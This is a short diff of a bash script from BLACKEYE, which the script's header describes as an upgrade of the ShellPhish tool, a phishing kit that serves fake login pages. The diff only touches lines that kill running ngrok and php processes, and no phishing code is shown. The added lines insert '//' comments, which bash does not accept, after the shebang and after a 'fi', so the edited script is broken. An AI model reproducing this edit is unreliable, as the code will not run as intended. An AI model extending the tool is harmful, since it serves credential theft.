@@ -1,4 +1,4 @@
-#!/bin/bash
+#!/bin/bash //UPDATE PHP SERVER coding
 # BLACKEYE v1.0 is an upgrade from original ShellPhish Tool (https://github.com/thelinuxchoice/shellphish) by thelinuxchoice under GNU LICENSE 
 # Coded by: @thelinuxchoice (https://github.com/thelinuxchoice/blackeye)
 # Upgraded by: @suljot_gjoka (https://github.com/whiteeagle0/blackeye)
@@ -200,8 +200,8 @@ checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-fi
+killall -2 ngrok > /dev/null 2>&1                          
+fi                                       //here you have to make changes for accepting php server also                            
 if [[ $checkphp == *'php'* ]]; then
 pkill -f -2 php > /dev/null 2>&1
 killall -2 php > /dev/null 2>&1
